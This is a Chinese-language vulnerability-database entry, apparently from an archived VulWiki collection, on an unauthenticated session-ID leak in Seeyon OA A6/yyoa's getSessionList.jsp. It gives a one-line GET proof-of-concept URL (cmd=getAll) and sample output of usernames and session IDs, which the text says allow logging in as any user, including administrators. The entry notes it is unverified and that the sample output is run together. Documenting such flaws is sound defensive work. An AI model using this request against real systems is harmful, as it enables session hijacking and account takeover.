---
source: "hatch 补库批 20260928"
title: "致远OA A6/yyoa getSessionList.jsp会话信息泄漏"
product: "致远OA A6/yyoa"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无具体版本；活跃会话才可复用"
prerequisites: "GET无凭证样例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
id: "vw-e513261a14e2cf7a6f3547e6"
entity_id: "ve-e513261a14e2cf7a6f3547e6"
schema_version: "1"
---

# 致远OA A6/yyoa getSessionList.jsp会话信息泄漏

## 条目说明

- 对象与具体问题：致远OA A6/yyoa；getSessionList.jsp会话信息泄漏
- 版本、配置及部署条件：无具体版本；活跃会话才可复用
- 认证与权限前提：GET无凭证样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 会话文本用户名和ID粘连，缺完整响应结构；会话是否仍有效需验证
- 简介/影响空白，不能保证所有用户含管理员都可登录

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

###### 漏洞位置:

    http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp

###### 漏洞详情:

    当cmd参数为getAll时，便可获取到所有用户的SessionID利用泄露的SessionID即可登录该用户，包括管理员

###### 请求方式:

    Get

###### POC:

    http://www.0-sec.org/yyoa/ext/https/getSessionList.jsp?cmd=getAll

###### 回显内容

    weiph 9EA4F8832FA1C9BA99E3D13E2F01CAF7zhaozy F9244E7F1B8C39BB8919FAE8E19ED16
